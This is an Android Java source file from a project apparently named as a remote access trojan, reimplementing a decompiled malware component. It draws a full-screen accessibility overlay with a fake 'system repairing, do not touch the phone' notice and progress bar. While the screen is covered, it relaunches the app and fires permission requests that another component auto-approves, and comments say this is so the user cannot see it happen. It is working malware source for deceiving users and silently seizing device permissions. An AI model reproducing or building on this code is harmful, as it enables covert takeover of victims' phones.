package com.vendor.rat.helper;

import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;

import android.accessibilityservice.AccessibilityService;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

/**
 * Vendor: com.guard.wallet.helper.g
 * Manages BlockView overlay — 全屏遮罩 + 进度条 + 提示文字
 *
 * vendor 流程:
 *   1. 无障碍授权后 j0() 触发 show()
 *   2. 在主线程创建 BlockOverlayView (图标+进度条+文字)
 *   3. 通过 WindowManager 添加为 TYPE_ACCESSIBILITY_OVERLAY
 *   4. 进度条从 0→100 动画 (约 5 秒)
 *   5. 完成后自动移除遮罩
 */
public abstract class BlockViewHelper {

    private static final String TAG = "BlockViewHelper";

    public static WindowManager windowManager;
    public static final AtomicReference<View> viewRef = new AtomicReference<>();
    public static final ReentrantLock lock = new ReentrantLock();
    public static final AtomicInteger savedBrightness = new AtomicInteger(-1);
    public static final AtomicBoolean destroyLock = new AtomicBoolean(true);
    public static final AtomicBoolean viewShowing = new AtomicBoolean(false);

    /**
     * Show block view overlay. Vendor: g.a(BlockViewVO)
     * Returns true if block view is currently showing.
     */
    public static boolean show(Object blockViewVO) {
        try {
            if (!isShowing() && MyAccessibilityService.getInstance() != null) {
                ReentrantLock l = lock;
                if (l.tryLock()) {
                    try {
                        // vendor: 判断是否在主线程，不在则 post 到主线程
                        if (Looper.myLooper() == Looper.getMainLooper()) {
                            createView(blockViewVO);
                        } else {
                            new Handler(Looper.getMainLooper()).post(() -> createView(blockViewVO));
                        }
                        // vendor: 等待 BlockView 显示到窗口 (最多 10 秒)
                        AtomicInteger counter = new AtomicInteger(0);
                        while (!viewShowing.get() && counter.incrementAndGet() < 100) {
                            Log.d(TAG, "副进程等待BlockView显示至窗口");
                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                        }
                    } finally {
                        l.unlock();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "show error", e);
        }
        return isShowing();
    }

    /**
     * Create and add block view to window. Vendor: g.b(BlockViewVO)
     * Must be called on main thread.
     */
    public static void createView(Object blockViewVO) {
        try {
            MyAccessibilityService service = MyAccessibilityService.getInstance();
            if (service == null) {
                Log.d(TAG, "BlockTextView 创建失败");
                return;
            }

            // vendor: 获取提示文字 (从 config 的 updateSystemMsg)
            String hint = null;
            if (com.vendor.rat.MainApplication.getInstance() != null
                && com.vendor.rat.MainApplication.getInstance().getConfig() != null) {
                hint = com.vendor.rat.MainApplication.getInstance().getConfig().getUpdateSystemMsg();
            }
            if (hint == null || hint.isEmpty()) {
                hint = "系统正在修复中\n请勿操作手机...";
            }

            // vendor: 创建 BlockOverlayView (e0.g → e0.i 内容层)
            BlockOverlayView overlayView = new BlockOverlayView(service, hint);

            // vendor: WindowManager 配置
            if (windowManager == null) {
                windowManager = (WindowManager) service.getSystemService("window");
            }

            WindowManager.LayoutParams params = new WindowManager.LayoutParams();
            // vendor: flags = 591800 (0x907B8)
            // = FLAG_NOT_FOCUSABLE | FLAG_NOT_TOUCHABLE | FLAG_NOT_TOUCH_MODAL
            //   | FLAG_KEEP_SCREEN_ON | FLAG_LAYOUT_IN_SCREEN | FLAG_LAYOUT_NO_LIMITS
            //   | FLAG_FULLSCREEN | FLAG_SHOW_WHEN_LOCKED | 0x10000
            params.flags = 591800;
            // vendor: format = 1 (OPAQUE)
            // ADAPT: 使用 TRANSLUCENT (-3) 让系统正确合成窗口层
            // 视觉不透明由背景色 0xFF000000 保证
            // OPAQUE 会阻止底层窗口 View 树的正确获取
            params.format = -3;
            params.alpha = 1.0f;
            params.x = 0;
            params.y = 0;
            // vendor: 使用屏幕实际尺寸而非 MATCH_PARENT
            android.util.DisplayMetrics dm = service.getResources().getDisplayMetrics();
            params.width = dm.widthPixels;
            params.height = dm.heightPixels;
            // vendor: TYPE_ACCESSIBILITY_OVERLAY (2032)
            params.type = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY;

            Log.d(TAG, "BlockTextView 创建完成");

            windowManager.addView(overlayView, params);

            // vendor: 监听 view attach 到窗口
            overlayView.getViewTreeObserver().addOnWindowAttachListener(
                new BlockViewAttachListener());

            viewRef.set(overlayView);
            viewShowing.set(true);

        } catch (Exception e) {
            Log.e(TAG, "createView error", e);
        }
    }

    /**
     * 启动进度条动画并在完成后自动移除遮罩
     * vendor: 通过 Handler.sendMessage 逐步更新进度 0→100
     *
     * @param durationMs 总时长 (毫秒)
     * @param onComplete 完成回调 (在主线程执行)
     */
    public static void animateProgressAndDismiss(int durationMs, Runnable onComplete) {
        Handler handler = new Handler(Looper.getMainLooper());
        final int steps = 100;
        final long stepDelay = durationMs / steps;

        for (int i = 1; i <= steps; i++) {
            final int progress = i;
            handler.postDelayed(() -> {
                sendProgress(progress);
                if (progress >= 100) {
                    // 进度完成，延迟 500ms 后移除遮罩
                    handler.postDelayed(() -> {
                        removeWithDestroy();
                        if (onComplete != null) {
                            onComplete.run();
                        }
                    }, 500);
                }
            }, stepDelay * i);
        }
    }

    /**
     * Remove block view with lock destroy. Vendor: g.c() → g.d()
     *
     * vendor g.d() 精确流程 (行 121-150):
     *   1. 恢复亮度
     *   2. F0(8) = GLOBAL_ACTION_RECENTS → 遮罩还在时把 app task 带到前台
     *   3. T0(5) = sleep 1s → 等待 RECENTS 动画完成
     *   4. removeViewImmediate → 移除遮罩，露出 app 界面
     *
     * 关键: RECENTS 在 removeView 之前执行!
     * 遮罩遮挡期间切换 task，用户看不到设置页面闪过
     */
    public static void removeWithDestroy() {
        try {
            if (viewRef.get() != null) {
                ReentrantLock l = lock;
                if (l.tryLock()) {
                    try {
                        // vendor g.d(): 在 removeView 之前把 app 带到前台
                        // 遮罩还在时执行，用户看不到切换过程
                        MyAccessibilityService service = MyAccessibilityService.getInstance();
                        if (service != null
                                && android.os.Build.VERSION.SDK_INT >= 28
                                && destroyLock.get()) {
                            // 清除 interrupt 标志 (Z() 中 shutdownNow 会设置)
                            Thread.interrupted();

                            // vendor: F0(8) = GLOBAL_ACTION_RECENTS
                            // ADAPT: ActivMain 已 finish，RECENTS 无法恢复 app task
                            // 改用 moveTaskToFront 或重新启动 ActivMain
                            try {
                                android.content.Context ctx = service.getApplicationContext();
                                android.content.Intent launchIntent = ctx.getPackageManager()
                                    .getLaunchIntentForPackage(ctx.getPackageName());
                                if (launchIntent != null) {
                                    launchIntent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                                        | android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP);
                                    ctx.startActivity(launchIntent);
                                    Log.d(TAG, "Launch app before removeView (遮罩遮挡中)");
                                } else {
                                    service.performGlobalAction(
                                        android.accessibilityservice.AccessibilityService
                                            .GLOBAL_ACTION_RECENTS);
                                    Log.d(TAG, "RECENTS fallback before removeView");
                                }
                            } catch (Exception ex) {
                                Log.e(TAG, "Launch app failed, using RECENTS", ex);
                                service.performGlobalAction(
                                    android.accessibilityservice.AccessibilityService
                                        .GLOBAL_ACTION_RECENTS);
                            }
                            // vendor: T0(5) = 200ms * 5 = 1s — 等待动画完成
                            try { Thread.sleep(1000); } catch (InterruptedException ignored) {}

                            // app 已回到前台、遮罩还在 → 触发权限请求
                            // PermissionAutoGrantEngine 在遮罩下自动点击"允许"
                            com.vendor.rat.activity.ActivMain.triggerPermissionRequest();
                            // 轮询等待权限全部授予（最多 30 秒）
                            for (int pw = 0; pw < 60; pw++) {
                                if (com.vendor.rat.activity.ActivMain.allPermissionsGranted()) break;
                                try { Thread.sleep(500); } catch (InterruptedException ignored) { break; }
                            }
                        }

                        // 然后移除 View
                        if (Looper.myLooper() == Looper.getMainLooper()) {
                            doRemoveView();
                        } else {
                            new Handler(Looper.getMainLooper()).post(() -> doRemoveView());
                        }

                        AtomicInteger counter = new AtomicInteger(0);
                        while (viewShowing.get() && counter.incrementAndGet() < 100) {
                            Log.d(TAG, "等待BlockView从窗口移除");
                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                        }
                    } finally {
                        l.unlock();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "removeWithDestroy error", e);
        }
    }

    /**
     * 实际移除 View — 必须在主线程调用
     */
    private static void doRemoveView() {
        try {
            AtomicInteger brightness = savedBrightness;
            if (brightness.get() > 0) {
                Log.d(TAG, "亮度已恢复");
                brightness.set(-1);
            }
            AtomicReference<View> ref = viewRef;
            if (ref.get() == null) return;
            if (windowManager != null && ref.get() != null) {
                windowManager.removeViewImmediate(ref.get());
                ref.set(null);
                viewShowing.set(false);
                destroyLock.set(true);
                Log.d(TAG, "BlockTextView 已从窗口移除");
            }
        } catch (Exception e) {
            Log.e(TAG, "doRemoveView error", e);
        }
    }

    /**
     * Internal remove with brightness restore and lock destroy. Vendor: g.d()
     * 保留用于 removeWithoutDestroy 等其他调用路径
     */
    public static void removeViewInternal() {
        doRemoveView();
    }

    /**
     * Remove block view without lock destroy. Vendor: g.e()
     */
    public static boolean removeWithoutDestroy() {
        try {
            if (viewRef.get() != null) {
                ReentrantLock l = lock;
                if (l.tryLock()) {
                    try {
                        removeViewSimple();
                        AtomicInteger counter = new AtomicInteger(0);
                        while (viewShowing.get() && counter.incrementAndGet() < 100) {
                            Log.d(TAG, "等待BlockView从窗口移除");
                            try { Thread.sleep(100); } catch (InterruptedException ignored) {}
                        }
                    } finally {
                        l.unlock();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "removeWithoutDestroy error", e);
        }
        return !isShowing();
    }

    /**
     * Simple remove without lock destroy flag. Vendor: g.f()
     */
    public static void removeViewSimple() {
        try {
            AtomicInteger brightness = savedBrightness;
            if (brightness.get() > 0) {
                Log.d(TAG, "亮度已恢复");
                brightness.set(-1);
            }
            AtomicReference<View> ref = viewRef;
            if (ref.get() == null || windowManager == null) {
                return;
            }
            windowManager.removeViewImmediate(ref.get());
            ref.set(null);
            viewShowing.set(false);
            destroyLock.set(true);
        } catch (Exception e) {
            Log.e(TAG, "removeViewSimple error", e);
        }
    }

    /**
     * Check if block view is currently showing. Vendor: g.g()
     */
    public static boolean isShowing() {
        return viewRef.get() != null && windowManager != null;
    }

    /**
     * Send progress to block view's progress bar. Vendor: g.h(int)
     * vendor 链路: viewRef → e0.g.f311a → e0.i.f313a → e0.f.handler.sendMessage
     */
    public static void sendProgress(int progress) {
        View overlay = viewRef.get();
        if (overlay == null || progress <= 0) return;

        // vendor: e0.g gVar = (e0.g) viewRef.get()
        if (!(overlay instanceof BlockOverlayView)) return;
        BlockOverlayView outer = (BlockOverlayView) overlay;

        // vendor: WeakReference f311a → e0.i
        if (outer.f311a == null || outer.f311a.get() == null) return;
        View inner = outer.f311a.get();

        if (!(inner instanceof BlockOverlayInner)) return;
        BlockOverlayInner innerView = (BlockOverlayInner) inner;

        // vendor: WeakReference f313a → e0.f (BlockProgressBar)
        if (innerView.f313a == null || innerView.f313a.get() == null) return;
        View progressView = innerView.f313a.get();

        if (!(progressView instanceof BlockProgressBar)) return;
        BlockProgressBar bar = (BlockProgressBar) progressView;

        // vendor: fVar.f305a.sendMessage(message)
        if (progress > 0) {
            android.os.Message message = new android.os.Message();
            message.what = progress;
            bar.handler.sendMessage(message);
        }
    }
}
